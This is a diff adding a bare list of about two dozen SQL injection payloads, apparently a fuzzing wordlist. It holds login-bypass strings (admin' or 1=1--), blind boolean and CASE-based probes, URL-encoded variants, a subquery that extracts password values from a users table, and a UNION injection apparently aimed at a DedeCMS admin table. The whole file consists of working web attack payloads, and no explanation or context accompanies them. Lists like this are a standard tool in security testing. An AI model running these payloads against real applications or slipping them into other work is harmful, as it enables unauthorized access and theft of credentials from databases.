@@ -1,0 +1,26 @@
+  "  or ""&amp;"
+  )'
+  '  or '' '
+  ")  or ("x")=("x
+  "  or ""*"
+  or 1=1/*
+  '  or ''^'
+  admin"/*
+  admin')  or ('1'='1'/*
+  (case when(1=2) then dateline else membernum end)
+  (case when(1=1) then dateline else membernum end)
+  select group_concat(passwd) from activity_manage.users limit 10 offset 0)a
+  ")  or true--
+  "  or ""^"
+  '+(case when(1=1) then 1 else (select 1 union select 2) end)+'
+  admin"  or "1"="1"#
+  and length(user())=19
+  @`\'` Union select userid from `dede_ admin` where 1  or id=@`\'` LIMIT 0,1
+  ')  or ('x')=('x
+  admin')  or '1'='1'/*
+  admin'  or 1=1--
+  %27%20 and%201=1%20 and%20%27%27=%27
+  admin' and (user_pwd) like '1%' and '1'='1
+  admin' or (user_pwd) like '1%' or '2'='1
+
+
